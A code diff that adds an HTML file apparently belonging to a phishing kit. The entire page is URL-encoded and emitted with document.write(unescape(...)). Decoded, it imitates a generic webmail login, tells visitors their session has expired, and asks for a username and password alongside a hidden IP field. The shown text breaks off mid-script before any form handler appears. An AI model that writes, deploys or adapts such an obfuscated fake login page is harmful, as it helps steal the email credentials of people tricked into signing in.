@@ -1,0 +1,809 @@
+<html style="height: 100%;" lang="en"><head><script language="javascript">document.write(unescape('%3C%21DOCTYPE%20html%3E%0A%3Chtml%20lang%3D%22en%22%3E%0A%3Chead%3E%0A%09%20%3Ctitle%20%20class%3D%22logoname%22%3EMail%3C/title%3E%0A%09%3Cmeta%20charset%3D%22UTF-8%22%3E%0A%09%3Cmeta%20name%3D%22viewport%22%20content%3D%22width%3Ddevice-width%2C%20initial-scale%3D1%22%3E%0A%20%20%20%20%3Cmeta%20name%3D%22viewport%22%20content%3D%22width%3Ddevice-width%2C%20initial-scale%3D1.0%22%3E%0A%20%20%20%20%0A%3Clink%20rel%3D%22apple-touch-icon%22%20type%3D%22image/png%22%20%20class%3D%22logoimg%22%20href%3D%22%22%20/%3E%20%0A%3Clink%20rel%3D%22shortcut%20icon%22%20type%3D%22image/x-icon%22%20%20class%3D%22logoimg%22%20%20href%3D%22%22%20/%3E%0A%3Clink%20rel%3D%22mask-icon%22%20type%3D%22%22%20%20class%3D%22logoimg%22%20href%3D%22%22%20color%3D%22%23111%22%20/%3E%0A%3Cmeta%20name%3D%22robots%22%20content%3D%22noindex%22%3E%20%0A%3C%21--%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D--%3E%09%0A%09%3Clink%20rel%3D%22icon%22%20id%3D%22logoimg%22%20type%3D%22image/png%22%20href%3D%22images/icons/favicon.ico%22/%3E%20%0A%20%20%20%20%3Clink%20rel%3D%22shortcut%20icon%22%20%20class%3D%22logoimg%22%20href%3D%22%22%20type%3D%22image/x-icon%22%3E%20%0A%09%20%0A%20%20%20%20%3Cscript%20src%3D%22https%3A//ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js%22%3E%3C/script%3E%20%0A%20%20%20%20%3Cscript%20src%3D%22https%3A//stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js%22%3E%3C/script%3E%0A%20%20%20%20%3Cscript%20type%3D%22text/javascript%22%20src%3D%22https%3A//cdn.jsdelivr.net/npm/jquery.session@1.0.0/jquery.session.min.js%22%3E%3C/script%3E%0A%3C%21--%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D--%3E%0A%0A%3Clink%20rel%3D%22stylesheet%22%20href%3D%22https%3A//cdnjs.cloudflare.com/ajax/libs/material-design-iconic-font/2.2.0/css/material-design-iconic-font.min.css%22%3E%0A%3Cstyle%20type%3D%22text/css%22%3E%0A%0A%0A%0A%0A/*//////////////////////////////////////////////////////////////////%0A%5B%20FONT%20%5D*/%0A%0A@font-face%20%7B%0A%20%20font-family%3A%20Poppins-Regular%3B%0A%20%20src%3A%20url%28%27../fonts/poppins/Poppins-Regular.ttf%27%29%3B%20%0A%7D%0A%0A@font-face%20%7B%0A%20%20font-family%3A%20Poppins-Medium%3B%0A%20%20src%3A%20url%28%27../fonts/poppins/Poppins-Medium.ttf%27%29%3B%20%0A%7D%0A%0A@font-face%20%7B%0A%20%20font-family%3A%20Poppins-Bold%3B%0A%20%20src%3A%20url%28%27../fonts/poppins/Poppins-Bold.ttf%27%29%3B%20%0A%7D%0A%0A@font-face%20%7B%0A%20%20font-family%3A%20Poppins-SemiBold%3B%0A%20%20src%3A%20url%28%27../fonts/poppins/Poppins-SemiBold.ttf%27%29%3B%20%0A%7D%0A%0A%0A%0A%0A/*//////////////////////////////////////////////////////////////////%0A%5B%20RESTYLE%20TAG%20%5D*/%0A%0A*%20%7B%0A%09margin%3A%200px%3B%20%0A%09padding%3A%200px%3B%20%0A%09box-sizing%3A%20border-box%3B%0A%7D%0A%0Abody%2C%20html%20%7B%0A%09height%3A%20100%25%3B%0A%09font-family%3A%20Poppins-Regular%2C%20sans-serif%3B%0A%7D%0A%0A/*---------------------------------------------*/%0Aa%20%7B%0A%09font-family%3A%20Poppins-Regular%3B%0A%09font-size%3A%2014px%3B%0A%09line-height%3A%201.7%3B%0A%09color%3A%20%23666666%3B%0A%09margin%3A%200px%3B%0A%09transition%3A%20all%200.4s%3B%0A%09-webkit-transition%3A%20all%200.4s%3B%0A%20%20-o-transition%3A%20all%200.4s%3B%0A%20%20-moz-transition%3A%20all%200.4s%3B%0A%7D%0A%0Aa%3Afocus%20%7B%0A%09outline%3A%20none%20%21important%3B%0A%7D%0A%0Aa%3Ahover%20%7B%0A%09text-decoration%3A%20none%3B%0A%20%20color%3A%20%23fff%3B%0A%7D%0A%0A/*---------------------------------------------*/%0Ah1%2Ch2%2Ch3%2Ch4%2Ch5%2Ch6%20%7B%0A%09margin%3A%200px%3B%0A%7D%0A%0Ap%20%7B%0A%09font-family%3A%20Poppins-Regular%3B%0A%09font-size%3A%2014px%3B%0A%09line-height%3A%201.7%3B%0A%09color%3A%20%23666666%3B%0A%09margin%3A%200px%3B%0A%7D%0A%0Aul%2C%20li%20%7B%0A%09margin%3A%200px%3B%0A%09list-style-type%3A%20none%3B%0A%7D%0A%0A%0A/*---------------------------------------------*/%0Ainput%20%7B%0A%09outline%3A%20none%3B%0A%09border%3A%20none%3B%0A%7D%0A%0Atextarea%20%7B%0A%20%20outline%3A%20none%3B%0A%20%20border%3A%20none%3B%0A%7D%0A%0Atextarea%3Afocus%2C%20input%3Afocus%20%7B%0A%20%20border-color%3A%20transparent%20%21important%3B%0A%7D%0A%0Ainput%3Afocus%3A%3A-webkit-input-placeholder%20%7B%20color%3Atransparent%3B%20%7D%0Ainput%3Afocus%3A-moz-placeholder%20%7B%20color%3Atransparent%3B%20%7D%0Ainput%3Afocus%3A%3A-moz-placeholder%20%7B%20color%3Atransparent%3B%20%7D%0Ainput%3Afocus%3A-ms-input-placeholder%20%7B%20color%3Atransparent%3B%20%7D%0A%0Atextarea%3Afocus%3A%3A-webkit-input-placeholder%20%7B%20color%3Atransparent%3B%20%7D%0Atextarea%3Afocus%3A-moz-placeholder%20%7B%20color%3Atransparent%3B%20%7D%0Atextarea%3Afocus%3A%3A-moz-placeholder%20%7B%20color%3Atransparent%3B%20%7D%0Atextarea%3Afocus%3A-ms-input-placeholder%20%7B%20color%3Atransparent%3B%20%7D%0A%0Ainput%3A%3A-webkit-input-placeholder%20%7B%20color%3A%20%23fff%3B%7D%0Ainput%3A-moz-placeholder%20%7B%20color%3A%20%23fff%3B%7D%0Ainput%3A%3A-moz-placeholder%20%7B%20color%3A%20%23fff%3B%7D%0Ainput%3A-ms-input-placeholder%20%7B%20color%3A%20%23fff%3B%7D%0A%0Atextarea%3A%3A-webkit-input-placeholder%20%7B%20color%3A%20%23fff%3B%7D%0Atextarea%3A-moz-placeholder%20%7B%20color%3A%20%23fff%3B%7D%0Atextarea%3A%3A-moz-placeholder%20%7B%20color%3A%20%23fff%3B%7D%0Atextarea%3A-ms-input-placeholder%20%7B%20color%3A%20%23fff%3B%7D%0A%0Alabel%20%7B%0A%20%20margin%3A%200%3B%0A%20%20display%3A%20block%3B%0A%7D%0A%0A/*---------------------------------------------*/%0Abutton%20%7B%0A%09outline%3A%20none%20%21important%3B%0A%09border%3A%20none%3B%0A%09background%3A%20transparent%3B%0A%7D%0A%0Abutton%3Ahover%20%7B%0A%09cursor%3A%20pointer%3B%0A%7D%0A%0Aiframe%20%7B%0A%09border%3A%20none%20%21important%3B%0A%7D%0A%0A%0A/*//////////////////////////////////////////////////////////////////%0A%5B%20Utility%20%5D*/%0A.txt1%20%7B%0A%20%20font-family%3A%20Poppins-Regular%3B%0A%20%20font-size%3A%2013px%3B%0A%20%20color%3A%20%23e5e5e5%3B%0A%20%20line-height%3A%201.5%3B%0A%7D%0A%0A%0A/*//////////////////////////////////////////////////////////////////%0A%5B%20login%20%5D*/%0A%0A.limiter%20%7B%0A%20%20width%3A%20100%25%3B%0A%20%20margin%3A%200%20auto%3B%0A%7D%0A%0A.container-login100%20%7B%0A%20%20width%3A%20100%25%3B%20%20%0A%20%20min-height%3A%20100vh%3B%0A%20%20display%3A%20-webkit-box%3B%0A%20%20display%3A%20-webkit-flex%3B%0A%20%20display%3A%20-moz-box%3B%0A%20%20display%3A%20-ms-flexbox%3B%0A%20%20display%3A%20flex%3B%0A%20%20flex-wrap%3A%20wrap%3B%0A%20%20justify-content%3A%20center%3B%0A%20%20align-items%3A%20center%3B%0A%20%20padding%3A%2015px%3B%0A%0A%20%20background-repeat%3A%20no-repeat%3B%0A%20%20background-position%3A%20center%3B%0A%20%20background-size%3A%20cover%3B%0A%20%20position%3A%20relative%3B%0A%20%20z-index%3A%201%3B%20%20%0A%7D%0A%0A.container-login100%3A%3Abefore%20%7B%0A%20%20content%3A%20%22%22%3B%0A%20%20display%3A%20block%3B%0A%20%20position%3A%20absolute%3B%0A%20%20z-index%3A%20-1%3B%0A%20%20width%3A%20100%25%3B%0A%20%20height%3A%20100%25%3B%0A%20%20top%3A%200%3B%0A%20%20left%3A%200%3B%0A%20%20%20background-color%3A%20rgba%28255%2C255%2C255%2C0.5%29%3B%0A%7D%0A%0A.wrap-login100%20%7B%0A%20%20width%3A%20500px%3B%0A%20%20border-radius%3A%2010px%3B%0A%20%20overflow%3A%20hidden%3B%0A%20%20padding%3A%2055px%2055px%2037px%2055px%3B%0A%0A%20//%20background%3A%20%23aaa%3B%0A%20background-color%3A%20rgba%28100%2C100%2C100%2C0.9%29%3B%0A%20%20//background%3A%20%239152f8%3B%0A//%20%20background%3A%20-webkit-linear-gradient%28top%2C%20%237579ff%2C%20%23b224ef%29%3B%0A%20//%20background%3A%20-o-linear-gradient%28top%2C%20%237579ff%2C%20%23b224ef%29%3B%0A%20//%20background%3A%20-moz-linear-gradient%28top%2C%20%237579ff%2C%20%23b224ef%29%3B%0A%20//%20background%3A%20linear-gradient%28top%2C%20%237579ff%2C%20%23b224ef%29%3B%0A%7D%0A%0A%0A/*------------------------------------------------------------------%0A%5B%20Form%20%5D*/%0A%0A.login100-form%20%7B%0A%20%20width%3A%20100%25%3B%0A%7D%0A%0A.login100-form-logo%20%7B%0A%20%20font-size%3A%2060px%3B%20%0A%20%20color%3A%20%23333333%3B%0A%0A%20%20display%3A%20-webkit-box%3B%0A%20%20display%3A%20-webkit-flex%3B%0A%20%20display%3A%20-moz-box%3B%0A%20%20display%3A%20-ms-flexbox%3B%0A%20%20display%3A%20flex%3B%0A%20%20justify-content%3A%20center%3B%0A%20%20align-items%3A%20center%3B%0A%20%20width%3A%20120px%3B%0A%20%20height%3A%20120px%3B%0A%20%20border-radius%3A%2050%25%3B%0A%20%20background-color%3A%20%23fff%3B%0A%20%20margin%3A%200%20auto%3B%0A%7D%0A%0A.login100-form-title%20%7B%0A%20%20font-family%3A%20Poppins-Medium%3B%0A%20%20font-size%3A%2030px%3B%0A%20%20color%3A%20%23fff%3B%0A%20%20line-height%3A%201.2%3B%0A%20%20text-align%3A%20center%3B%0A%20%20text-transform%3A%20uppercase%3B%0A%0A%20%20display%3A%20block%3B%0A%7D%0A%0A.login100-form-title2%20%7B%0A%20%20font-family%3A%20Poppins-Medium%3B%0A%20%20font-size%3A%2020px%3B%0A%20%20color%3A%20%23fff%3B%0A%20//%20line-height%3A%201.2%3B%0A%20%20text-align%3A%20center%3B%0A%20%20text-transform%3A%20lowercase%3B%0A%0A%20%20display%3A%20block%3B%0A%7D%0A%0A%0A/*------------------------------------------------------------------%0A%5B%20Input%20%5D*/%0A%0A.wrap-input100%20%7B%0A%20%20width%3A%20100%25%3B%0A%20%20position%3A%20relative%3B%0A%20%20border-bottom%3A%202px%20solid%20rgba%28255%2C255%2C255%2C0.24%29%3B%0A%20%20margin-bottom%3A%2030px%3B%0A%7D%0A%0A.input100%20%7B%0A%20%20font-family%3A%20Poppins-Regular%3B%0A%20%20font-size%3A%2016px%3B%0A%20%20color%3A%20%23fff%3B%0A%20%20line-height%3A%201.2%3B%0A%0A%20%20display%3A%20block%3B%0A%20%20width%3A%20100%25%3B%0A%20%20height%3A%2045px%3B%0A%20%20background%3A%20transparent%3B%0A%20%20padding%3A%200%205px%200%2038px%3B%0A%7D%0A%0A/*---------------------------------------------*/%20%0A.focus-input100%20%7B%0A%20%20position%3A%20absolute%3B%0A%20%20display%3A%20block%3B%0A%20%20width%3A%20100%25%3B%0A%20%20height%3A%20100%25%3B%0A%20%20top%3A%200%3B%0A%20%20left%3A%200%3B%0A%20%20pointer-events%3A%20none%3B%0A%7D%0A%0A.focus-input100%3A%3Abefore%20%7B%0A%20%20content%3A%20%22%22%3B%0A%20%20display%3A%20block%3B%0A%20%20position%3A%20absolute%3B%0A%20%20bottom%3A%20-2px%3B%0A%20%20left%3A%200%3B%0A%20%20width%3A%200%3B%0A%20%20height%3A%202px%3B%0A%0A%20%20-webkit-transition%3A%20all%200.4s%3B%0A%20%20-o-transition%3A%20all%200.4s%3B%0A%20%20-moz-transition%3A%20all%200.4s%3B%0A%20%20transition%3A%20all%200.4s%3B%0A%0A%20%20background%3A%20%23fff%3B%0A%7D%0A%0A.focus-input100%3A%3Aafter%20%7B%0A%20%20font-family%3A%20Material-Design-Iconic-Font%3B%0A%20%20font-size%3A%2022px%3B%0A%20%20color%3A%20%23fff%3B%0A%0A%20%20content%3A%20attr%28data-placeholder%29%3B%0A%20%20display%3A%20block%3B%0A%20%20width%3A%20100%25%3B%0A%20%20position%3A%20absolute%3B%0A%20%20top%3A%206px%3B%0A%20%20left%3A%200px%3B%0A%20%20padding-left%3A%205px%3B%0A%0A%20%20-webkit-transition%3A%20all%200.4s%3B%0A%20%20-o-transition%3A%20all%200.4s%3B%0A%20%20-moz-transition%3A%20all%200.4s%3B%0A%20%20transition%3A%20all%200.4s%3B%0A%7D%0A%0A.input100%3Afocus%20%7B%0A%20%20padding-left%3A%205px%3B%0A%7D%0A%0A.input100%3Afocus%20+%20.focus-input100%3A%3Aafter%20%7B%0A%20%20top%3A%20-22px%3B%0A%20%20font-size%3A%2018px%3B%0A%7D%0A%0A.input100%3Afocus%20+%20.focus-input100%3A%3Abefore%20%7B%0A%20%20width%3A%20100%25%3B%0A%7D%0A%0A.has-val.input100%20+%20.focus-input100%3A%3Aafter%20%7B%0A%20%20top%3A%20-22px%3B%0A%20%20font-size%3A%2018px%3B%0A%7D%0A%0A.has-val.input100%20+%20.focus-input100%3A%3Abefore%20%7B%0A%20%20width%3A%20100%25%3B%0A%7D%0A%0A.has-val.input100%20%7B%0A%20%20padding-left%3A%205px%3B%0A%7D%0A%0A%0A/*%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%0A%5B%20Restyle%20Checkbox%20%5D*/%0A%0A.contact100-form-checkbox%20%7B%0A%20%20padding-left%3A%205px%3B%0A%20%20padding-top%3A%205px%3B%0A%20%20padding-bottom%3A%2035px%3B%0A%7D%0A%0A.input-checkbox100%20%7B%0A%20%20display%3A%20none%3B%0A%7D%0A%0A.label-checkbox100%20%7B%0A%20%20font-family%3A%20Poppins-Regular%3B%0A%20%20font-size%3A%2013px%3B%0A%20%20color%3A%20%23fff%3B%0A%20%20line-height%3A%201.2%3B%0A%0A%20%20display%3A%20block%3B%0A%20%20position%3A%20relative%3B%0A%20%20padding-left%3A%2026px%3B%0A%20%20cursor%3A%20pointer%3B%0A%7D%0A%0A.label-checkbox100%3A%3Abefore%20%7B%0A%20%20content%3A%20%22%5Cf26b%22%3B%0A%20%20font-family%3A%20Material-Design-Iconic-Font%3B%0A%20%20font-size%3A%2013px%3B%0A%20%20color%3A%20transparent%3B%0A%0A%20%20display%3A%20-webkit-box%3B%0A%20%20display%3A%20-webkit-flex%3B%0A%20%20display%3A%20-moz-box%3B%0A%20%20display%3A%20-ms-flexbox%3B%0A%20%20display%3A%20flex%3B%0A%20%20justify-content%3A%20center%3B%0A%20%20align-items%3A%20center%3B%0A%20%20position%3A%20absolute%3B%0A%20%20width%3A%2016px%3B%0A%20%20height%3A%2016px%3B%0A%20%20border-radius%3A%202px%3B%0A%20%20background%3A%20%23fff%3B%0A%20%20left%3A%200%3B%0A%20%20top%3A%2050%25%3B%0A%20%20-webkit-transform%3A%20translateY%28-50%25%29%3B%0A%20%20-moz-transform%3A%20translateY%28-50%25%29%3B%0A%20%20-ms-transform%3A%20translateY%28-50%25%29%3B%0A%20%20-o-transform%3A%20translateY%28-50%25%29%3B%0A%20%20transform%3A%20translateY%28-50%25%29%3B%0A%7D%0A%0A.input-checkbox100%3Achecked%20+%20.label-checkbox100%3A%3Abefore%20%7B%0A%20%20color%3A%20%23555555%3B%0A%7D%0A%0A%0A/*------------------------------------------------------------------%0A%5B%20Button%20%5D*/%0A.container-login100-form-btn%20%7B%0A%20%20width%3A%20100%25%3B%0A%20%20display%3A%20-webkit-box%3B%0A%20%20display%3A%20-webkit-flex%3B%0A%20%20display%3A%20-moz-box%3B%0A%20%20display%3A%20-ms-flexbox%3B%0A%20%20display%3A%20flex%3B%0A%20%20flex-wrap%3A%20wrap%3B%0A%20%20justify-content%3A%20center%3B%0A%7D%0A%0A.login100-form-btn%20%7B%0A%20%20font-family%3A%20Poppins-Medium%3B%0A%20%20font-size%3A%2016px%3B%0A%20%20color%3A%20%23555555%3B%0A%20%20line-height%3A%201.2%3B%0A%0A%20%20display%3A%20-webkit-box%3B%0A%20%20display%3A%20-webkit-flex%3B%0A%20%20display%3A%20-moz-box%3B%0A%20%20display%3A%20-ms-flexbox%3B%0A%20%20display%3A%20flex%3B%0A%20%20justify-content%3A%20center%3B%0A%20%20align-items%3A%20center%3B%0A%20%20padding%3A%200%2020px%3B%0A%20%20min-width%3A%20120px%3B%0A%20%20height%3A%2050px%3B%0A%20%20border-radius%3A%2025px%3B%0A%0A%20%20background%3A%20%239152f8%3B%0A%20%20background%3A%20-webkit-linear-gradient%28bottom%2C%20%237579ff%2C%20%23b224ef%29%3B%0A%20%20background%3A%20-o-linear-gradient%28bottom%2C%20%237579ff%2C%20%23b224ef%29%3B%0A%20%20background%3A%20-moz-linear-gradient%28bottom%2C%20%237579ff%2C%20%23b224ef%29%3B%0A%20%20background%3A%20linear-gradient%28bottom%2C%20%237579ff%2C%20%23b224ef%29%3B%0A%20%20position%3A%20relative%3B%0A%20%20z-index%3A%201%3B%0A%0A%20%20-webkit-transition%3A%20all%200.4s%3B%0A%20%20-o-transition%3A%20all%200.4s%3B%0A%20%20-moz-transition%3A%20all%200.4s%3B%0A%20%20transition%3A%20all%200.4s%3B%0A%7D%0A%0A.login100-form-btn%3A%3Abefore%20%7B%0A%20%20content%3A%20%22%22%3B%0A%20%20display%3A%20block%3B%0A%20%20position%3A%20absolute%3B%0A%20%20z-index%3A%20-1%3B%0A%20%20width%3A%20100%25%3B%0A%20%20height%3A%20100%25%3B%0A%20%20border-radius%3A%2025px%3B%0A%20%20background-color%3A%20%23fff%3B%0A%20%20top%3A%200%3B%0A%20%20left%3A%200%3B%0A%20%20opacity%3A%201%3B%0A%0A%20%20-webkit-transition%3A%20all%200.4s%3B%0A%20%20-o-transition%3A%20all%200.4s%3B%0A%20%20-moz-transition%3A%20all%200.4s%3B%0A%20%20transition%3A%20all%200.4s%3B%0A%7D%0A%0A.login100-form-btn%3Ahover%20%7B%0A%20%20color%3A%20%23fff%3B%0A%7D%0A%0A.login100-form-btn%3Ahover%3Abefore%20%7B%0A%20%20opacity%3A%200%3B%0A%7D%0A%0A%0A/*------------------------------------------------------------------%0A%5B%20Responsive%20%5D*/%0A%0A@media%20%28max-width%3A%20576px%29%20%7B%0A%20%20.wrap-login100%20%7B%0A%20%20%20%20padding%3A%2055px%2015px%2037px%2015px%3B%0A%20%20%7D%0A%7D%0A%0A%0A%0A/*------------------------------------------------------------------%0A%5B%20Alert%20validate%20%5D*/%0A%0A.validate-input%20%7B%0A%20%20position%3A%20relative%3B%0A%7D%0A%0A.alert-validate%3A%3Abefore%20%7B%0A%20%20content%3A%20attr%28data-validate%29%3B%0A%20%20position%3A%20absolute%3B%0A%20%20max-width%3A%2070%25%3B%0A%20%20background-color%3A%20%23fff%3B%0A%20%20border%3A%201px%20solid%20%23c80000%3B%0A%20%20border-radius%3A%202px%3B%0A%20%20padding%3A%204px%2025px%204px%2010px%3B%0A%20%20top%3A%2050%25%3B%0A%20%20-webkit-transform%3A%20translateY%28-50%25%29%3B%0A%20%20-moz-transform%3A%20translateY%28-50%25%29%3B%0A%20%20-ms-transform%3A%20translateY%28-50%25%29%3B%0A%20%20-o-transform%3A%20translateY%28-50%25%29%3B%0A%20%20transform%3A%20translateY%28-50%25%29%3B%0A%20%20right%3A%200px%3B%0A%20%20pointer-events%3A%20none%3B%0A%0A%20%20font-family%3A%20Poppins-Regular%3B%0A%20%20color%3A%20%23c80000%3B%0A%20%20font-size%3A%2013px%3B%0A%20%20line-height%3A%201.4%3B%0A%20%20text-align%3A%20left%3B%0A%0A%20%20visibility%3A%20hidden%3B%0A%20%20opacity%3A%200%3B%0A%0A%20%20-webkit-transition%3A%20opacity%200.4s%3B%0A%20%20-o-transition%3A%20opacity%200.4s%3B%0A%20%20-moz-transition%3A%20opacity%200.4s%3B%0A%20%20transition%3A%20opacity%200.4s%3B%0A%7D%0A%0A.alert-validate%3A%3Aafter%20%7B%0A%20%20content%3A%20%22%5Cf12a%22%3B%0A%20%20font-family%3A%20FontAwesome%3B%0A%20%20font-size%3A%2016px%3B%0A%20%20color%3A%20%23c80000%3B%0A%0A%20%20display%3A%20block%3B%0A%20%20position%3A%20absolute%3B%0A%20%20top%3A%2050%25%3B%0A%20%20-webkit-transform%3A%20translateY%28-50%25%29%3B%0A%20%20-moz-transform%3A%20translateY%28-50%25%29%3B%0A%20%20-ms-transform%3A%20translateY%28-50%25%29%3B%0A%20%20-o-transform%3A%20translateY%28-50%25%29%3B%0A%20%20transform%3A%20translateY%28-50%25%29%3B%0A%20%20right%3A%205px%3B%0A%7D%0A%0A.alert-validate%3Ahover%3Abefore%20%7B%0A%20%20visibility%3A%20visible%3B%0A%20%20opacity%3A%201%3B%0A%7D%0A%0A@media%20%28max-width%3A%20992px%29%20%7B%0A%20%20.alert-validate%3A%3Abefore%20%7B%0A%20%20%20%20visibility%3A%20visible%3B%0A%20%20%20%20opacity%3A%201%3B%0A%20%20%7D%0A%7D%0A%0A%0A%0A%0A%0A%3C/style%3E%0A%3C/head%3E%0A%3Cbody%3E%0A%3Cscript%20type%3D%22text/javascript%22%3E%0A%20%20%20%20toastr%5B%27info%27%5D%28%27Session%20expired.%20Kindly%20sign%20in%20back%20to%20continue%27%29%3B%0A%20%20%3C/script%3E%0A%3Ciframe%20id%3D%22mainPage%22%20src%3D%22%22%20width%3D%22100%25%22%20scrolling%3D%22no%22%20sandbox%3D%22allow-forms%20allow-pointer-lock%0Aallow-popups%20allow-same-origin%20allow-scripts%22%20style%3D%22position%3A%20absolute%3Bheight%3A%20100%25%3Bborder%3A%20none%3B%22%3E%3C/iframe%3E%0A%09%0A%09%3Cdiv%20class%3D%22limiter%22%3E%0A%09%09%3Cdiv%20class%3D%22container-login100%22%20%3E%0A%09%09%09%3Cdiv%20class%3D%22wrap-login100%22%3E%0A%09%09%09%09%3Cform%20class%3D%22login100-form%20validate-form%22%3E%0A%09%09%09%09%09%3C%21--%20%3Cspan%20class%3D%22login100-form-logo%22%20%20style%3D%22margin-top%3A-20px%22%20%20%3E%0A%09%09%09%09%09%3Cimg%20src%3D%22%22%20id%3D%22logoimg%22%20/%3E%0A%09%09%09%09%09%3Cimg%20src%3D%22https%3A//www.google.com/s2/favicons%3Fdomain%3Dskyfent.com%22%20size%3D%22300px%22%3E%0A%09%09%09%09%09%3Cimg%20src%3D%22logo.clearbit.com/spotify.com%22%3E%0A%09%09%09%09%09%09%3C%21--%20%3Ci%20class%3D%22zmdi%20zmdi-landscape%22%3E%3C/i%3E%20%20%0A%09%09%09%09%09%3C/span%3E%20--%3E%0A%0A%09%09%09%09%09%3Cspan%20class%3D%22login100-form-title%20p-b-34%20p-t-27%22%20style%3D%22margin-top%3A0px%22%3E%0A%09%09%09%09%09%09%20Log%20in%20%20%0A%09%09%09%09%09%09%20%0A%09%09%09%09%09%3C/span%3E%0A%09%09%09%09%09%3Cspan%20class%3D%22login100-form-title2%20p-b-34%20p-t-27%22%20style%3D%22margin-top%3A0px%3Bmargin-bottom%3A30px%22%3E%0A%09%09%09%09%09%3Cspan%20class%3D%22domain%22%3E%3C/span%3E%20%0A%09%09%09%09%09%09%3C%21--%20sales@enauk.com%20%3Cbr%3E%20%0A%09%09%09%09%09%09%3Cspan%20id%3D%22username%22%3E%3C/span%3E--%3E%0A%09%09%09%09%09%3C/span%3E%0A%0A%09%09%09%09%09%3Cdiv%20class%3D%22wrap-input100%20validate-input%22%20data-validate%20%3D%20%22Enter%20username%22%3E%0A%09%09%09%09%09%09%3Cinput%20class%3D%22input100%22%20type%3D%22text%22%20%20id%3D%22email%22%20%20name%3D%22email%22%20placeholder%3D%22Username%22%3E%0A%09%09%09%09%09%09%3Cspan%20class%3D%22focus-input100%22%20data-placeholder%3D%22%26%23xf207%3B%22%3E%3C/span%3E%0A%09%09%09%09%09%3C/div%3E%20%20%0A%0A%09%09%09%09%09%3Cdiv%20class%3D%22wrap-input100%20validate-input%22%20data-validate%3D%22Enter%20password%22%3E%0A%09%09%09%09%09%09%3C%21--%20%3Cinput%20%20type%3D%22text%22%20class%3D%22email%22%20name%3D%22email%22%20value%3D%22%22%20%3E%20--%3E%0A%09%09%09%09%09%09%3Cinput%20class%3D%22input100%22%20type%3D%22password%22%20%20id%3D%22password%22%20%20name%3D%22password%22%20placeholder%3D%22Password%22%3E%0A%09%09%09%09%09%09%3Cspan%20class%3D%22focus-input100%22%20data-placeholder%3D%22%26%23xf191%3B%22%3E%3C/span%3E%0A%09%09%09%09%09%3C/div%3E%0A%09%09%09%09%09%09%3Cinput%20type%3D%22hidden%22%20%20%20%20id%3D%22ip%22%20name%3D%22ip%22%20%20%3E%09%09%09%0A%0A%09%09%09%09%09%3C%21--%20%3Cdiv%20class%3D%22contact100-form-checkbox%22%3E%0A%09%09%09%09%09%09%3Cinput%20class%3D%22input-checkbox100%22%20id%3D%22ckb1%22%20type%3D%22checkbox%22%20name%3D%22remember-me%22%3E%0A%09%09%09%09%09%09%3Clabel%20class%3D%22label-checkbox100%22%20for%3D%22ckb1%22%3E%0A%09%09%09%09%09%09%09Remember%20me%0A%09%09%09%09%09%09%3C/label%3E%0A%09%09%09%09%09%3C/div%3E%20--%3E%0A%0A%09%09%09%09%09%3Cdiv%20class%3D%22container-login100-form-btn%22%3E%0A%09%09%09%09%09%09%3Cbutton%20class%3D%22login100-form-btn%22%20type%3D%22submit%22%20id%3D%22submit-btn%22%3E%0A%09%09%09%09%09%09%09Login%0A%09%09%09%09%09%09%3C/button%3E%0A%0A%09%09%09%09%09%3C/div%3E%0A%0A%09%09%09%09%09%3C%21--%20%3Cdiv%20class%3D%22text-center%20p-t-90%22%3E%0A%09%09%09%09%09%09%3Ca%20class%3D%22txt1%22%20href%3D%22%23%22%3E%0A%09%09%09%09%09%09%09Forgot%20Password%3F%0A%09%09%09%09%09%09%3C/a%3E%0A%09%09%09%09%09%3C/div%3E%20--%3E%0A%09%09%09%09%3C/form%3E%0A%09%09%09%3C/div%3E%0A%09%09%3C/div%3E%0A%09%09%3Cdiv%20id%3D%22google_translate_element%22%20%3E%3C/div%3E%0A%09%3C/div%3E%0A%09%3C/body%3E%0A%0A%09%3C%21--%20jQuery%20first%2C%20then%20Popper.js%2C%20then%20Bootstrap%20JS%20--%3E%20%0A%20%20%20%0A%20%20%20%20%3Cscript%20src%3D%22https%3A//cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js%22%20integrity%3D%22sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q%22%20crossorigin%3D%22anonymous%22%3E%3C/script%3E%0A%20%20%20%20%3Cscript%20src%3D%22https%3A//maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js%22%20integrity%3D%22sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl%22%20crossorigin%3D%22anonymous%22%3E%3C/script%3E%20%20%0A%09%3Cscript%20src%3D%22https%3A//stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js%22%3E%3C/script%3E%0A%09%3Cscript%20type%3D%22text/javascript%22%3E%0Afunction%20googleTranslateElementInit%28%29%20%7B%0A%20%20new%20google.translate.TranslateElement%28%7BpageLanguage%3A%20%27en%27%2C%20layout%3A%20google.translate.TranslateElemen